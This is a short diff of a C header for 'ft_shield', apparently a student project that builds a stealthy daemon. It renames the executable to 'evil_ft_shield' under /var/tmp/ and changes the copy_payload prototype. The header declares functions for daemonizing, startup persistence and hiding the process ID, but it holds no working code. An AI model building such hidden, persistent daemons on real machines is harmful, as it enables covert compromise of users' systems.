@@ -32,7 +32,7 @@
 #define LOG_NAME  "ft_shield.log"
 #define LOG_FILE  LOG_PATH LOG_NAME
 // executable
-#define EXECUTABLE_NAME "ft_shield"
+#define EXECUTABLE_NAME "evil_ft_shield"
 #define EXECUTABLE_PATH "/var/tmp/" // TODO poner la ubicación final
 #define EXECUTABLE_FILE EXECUTABLE_PATH EXECUTABLE_NAME
 // system init
@@ -68,7 +68,7 @@ t_daemon    *create_daemon( void );
 void        init_socket_struct(t_daemon *daemon);
 bool        init_server(t_daemon *daemon);
 void        ft_daemonize(void);
-void        copy_payload(void);
+void        copy_payload(char *curdir);
 void        startup_setup(void);
 void        hide_pid(void);
 void        create_lock_file(t_daemon *daemon);
